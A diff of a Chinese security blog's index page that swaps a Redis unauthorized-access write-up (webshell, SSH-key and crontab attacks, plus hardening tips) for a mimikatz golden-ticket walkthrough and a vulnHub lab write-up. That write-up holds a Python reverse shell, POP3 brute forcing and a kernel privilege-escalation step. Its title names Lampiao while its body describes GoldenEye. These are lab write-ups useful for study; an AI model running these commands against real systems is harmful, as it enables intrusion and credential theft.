@@ -119,7 +119,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">51</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">49</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -159,7 +159,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/author.jpg">
@@ -173,7 +173,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
+            <a href="/2021/07/05/%E9%87%91%E7%A5%A8/" class="post-title-link" itemprop="url">域渗透之金票</a>
         </h2>
 
         <div class="post-meta">
@@ -182,29 +182,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
+              <time title="创建时间：2021-07-05 14:28:21 / 修改时间：17:00:33" itemprop="dateCreated datePublished" datetime="2021-07-05T14:28:21+08:00">2021-07-05</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-03 16:32:38" itemprop="dateModified" datetime="2021-07-03T16:32:38+08:00">2021-07-03</time>
-              </span>
 
           
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>2.6k</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>2 分钟</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -216,108 +210,78 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
-<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票</p>
+<h1 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h1><table>
+<thead>
+<tr>
+<th align="center">ROLE</th>
+<th align="center">IP</th>
+<th align="center">OS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DC域控</td>
+<td align="center">192.168.221.135</td>
+<td align="center">2008</td>
+</tr>
+<tr>
+<td align="center">DM</td>
+<td align="center">192.168.221.133</td>
+<td align="center">2003</td>
+</tr>
+<tr>
+<td align="center">DM</td>
+<td align="center">192.168.221.132</td>
+<td align="center">xp</td>
+</tr>
+</tbody></table>
+<h1 id="票据生成条件："><a href="#票据生成条件：" class="headerlink" title="票据生成条件："></a>票据生成条件：</h1><ol>
+<li><p><strong>域名</strong></p>
+<p>swanq.com</p>
+</li>
+<li><p><strong>域的SID值</strong>     </p>
+<p>SID：s-1-5-21-1591593742-2040670928-2738819432</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/2.png"></p>
+<blockquote>
+<p>SID：500代表管理员</p>
+</blockquote>
+</li>
+<li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
+</li>
+<li><p><strong>伪造用户名，可以是任意用户名</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user ceshi swanq000!<span class="selector-tag">@</span><span class="comment"># /add /domain</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.png"></p>
+<p>新建用户可以是在域管或者域控上，只要有权限创建域内账户即可。</p>
+</li>
+</ol>
+<h1 id="获取krbtgt的HTLM-hash"><a href="#获取krbtgt的HTLM-hash" class="headerlink" title="获取krbtgt的HTLM-hash"></a>获取krbtgt的HTLM-hash</h1><p>mimikatz获取krbtgt的NTLMhash</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:swanq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/3.png"></p>
+<blockquote>
+<p><strong>dcsync</strong></p>
+<p>概述：mimikatz功能，可模拟DC域控并从DC中导出帐户密码的hash</p>
+<p>详解：</p>
 <ul>
-<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
-<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
-</ul>
-<p>漏洞可能产生的危害:</p>
-<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
-<p>下图为redis拿shell的三种方式及其条件：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
-<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
-<p>攻击机：kali 192.168.140.130</p>
-<p>kali一键安装redis，sudo apt install redis</p>
-<p>Ubuntu debian或其他环境安装指南：</p>
-<p>安装：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>
-
-<p>配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
-
-<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
-<p>为保证后面写入计划任务，此处以root权限启动redis</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
-<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
-<p>晓得绝对路径</p>
-<p>当然还要有写入权限</p>
-<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
-<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
-<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
-<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
-<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
-<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
-<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
-<blockquote>
-<p>shell的echo :</p>
-<p>用于字符串输出，其注意事项如下图所示：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
-</blockquote>
-<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
-<blockquote>
-<p>-x：read last argument from STDIN</p>
-<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
-<ul>
-<li><p>cat key.txt 输出 作为后面的输入</p>
+<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，可以模仿域控从真实的域控当中请求数据。</p>
 </li>
-<li><p>-x 读取标准输入</p>
-</li>
-<li><p>set crack 是将读取的输入作为crack此参数内容</p>
-<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
+<li><p>dcsync特点在于不用登录服务器，就可以远程通过域数据同步复制的方式获得想要的用户口令。</p>
 </li>
 </ul>
 </blockquote>
-<p>找到靶机redis备份路径：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
-<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
-<blockquote>
-<p>config:可查看或设置配置项</p>
-<p>dbfilename:备份文件</p>
-</blockquote>
-<p>SSH远程登陆成功</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
-<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
-<p>多见于CentOs使用</p>
-<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
-<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
-<blockquote>
-<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
-<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
-<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
-<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
-</blockquote>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
-<p>观察到此时并无反弹shell。但是确实写入成功。</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
-<p>具体排查问题另起一篇博客说明。</p>
-<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="伪造票据"><a href="#伪造票据" class="headerlink" title="伪造票据"></a>伪造票据</h1><p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能生成金票golden.kiribi伪造TGT</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:swanq.com /sid:s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1591593742</span><span class="literal">-2040670928</span><span class="literal">-2738819432</span> /krbtgt:<span class="number">6</span>d34590dfef0bd5d9e0d391140b0aab /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
-<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
-<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
-<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
+<h1 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h1><p>清空本地票据缓存，导入伪造的票据</p>
+<p>kerberos::purge   #清除本地票据缓存</p>
+<p>kerberos::list      #查看本地保存的票据，观察client name</p>
+<p>Kerberos::ptt golden kiribi   #导入伪造的黄金票据<br>kerberos::list     #查看本地保存的票据，观察client name是否变为我们票据中的用户名</p>
+<p>参考：</p>
+<ol>
+<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
+<li></li>
 </ol>
 
       
@@ -352,7 +316,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/07/02/vulnHub-Lampiao/" class="post-title-link" itemprop="url">vulnHub靶机系列：Lampiao</a>
+            <a href="/2021/07/02/vulnHub-Lampiao/" class="post-title-link" itemprop="url">vulnHub靶机系列：shentouLampiao渗透Writeup</a>
         </h2>
 
         <div class="post-meta">
@@ -369,7 +333,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-03 13:53:31" itemprop="dateModified" datetime="2021-07-03T13:53:31+08:00">2021-07-03</time>
+                <time title="修改时间：2021-07-05 09:19:54" itemprop="dateModified" datetime="2021-07-05T09:19:54+08:00">2021-07-05</time>
               </span>
 
           
@@ -377,13 +341,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>100</span>
+              <span>2.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -399,8 +363,135 @@
 <p>Would you like to keep hacking in your own lab?</p>
 <p>Try this brand new vulnerable machine! “Lampião 1”.</p>
 <p>Get root!</p>
-<p>Level: Easy</p>
 </blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本靶场目标：获取root权限</p>
+<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.221.136</p>
+<p>攻击机：kali 192.168.221.130</p>
+<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.221.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.221.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/02/vulnHub-Lampiao/1.png"></p>
+<p>22：ssh</p>
+<p>80</p>
+<p>1898：apache 2.4.7</p>
+<p>还有一个服务识别不了，返回数据</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\3.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\4.png"></p>
+<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\5.png"></p>
+<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
+<p>通过报错信息也可看到中间件为apache</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\6.png"></p>
+<p>访问terminal.js看到以下信息</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\7.png"></p>
+<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\8.png"></p>
+<blockquote>
+<p>加密格式总结：</p>
+<ul>
+<li>Unicode：\u开头</li>
+<li>UTF8/URL：%开头</li>
+<li>UTF16：\x开头</li>
+<li>&amp;#73;：　73为ASCII码，对应I</li>
+</ul>
+</blockquote>
+<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\9.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\10.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\19.png"></p>
+<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\11.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\12.png"></p>
+<p>密码为 secret1!</p>
+<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\13.png"></p>
+<p>其中三封邮件内容如下，</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\14.png"></p>
+<p>root发给boris的邮件</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\15.png"></p>
+<p>natalya发给boris的邮件</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\16.png"></p>
+<p>alec发给boris的邮件</p>
+<p>再查看natalya的邮件有什么信息。</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\17.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\18.png"></p>
+<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>
+
+<p>打开本机/etc/hosts。添加域信息</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\20.png"></p>
+<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\21.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\22.png"></p>
+<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\23.png"></p>
+<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
+<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
+<p>靶机：GoldenEye 192.168.221.128</p>
+<p>攻击机：kali 192.168.221.130</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\24.png"></p>
+<p>得到doak的CMS的账户密码：</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\25.png"></p>
+<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\26.png"></p>
+<p>找到一个jpg文件位于以下位置：</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\27.png"></p>
+<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\28.png"></p>
+<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
+<p>账号：admin</p>
+<p>密码：xWinter1995x!</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\29.png"></p>
+<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\30.png"></p>
+<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
+<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<p>监听本机8099端口</p>
+<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\33.png"></p>
+<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\34.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\35.png"></p>
+<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>进入靶机/tmp目录下载EXP</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\36.png"></p>
+<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\40.png"></p>
+<p>然后重新下载shell并编译</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\37.png"></p>
+<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\38.png"></p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\39.png"></p>
+<p>we get it!</p>
+<p><img src="/2021/07/02/vulnHub-Lampiao/blog\source_posts\41.png"></p>
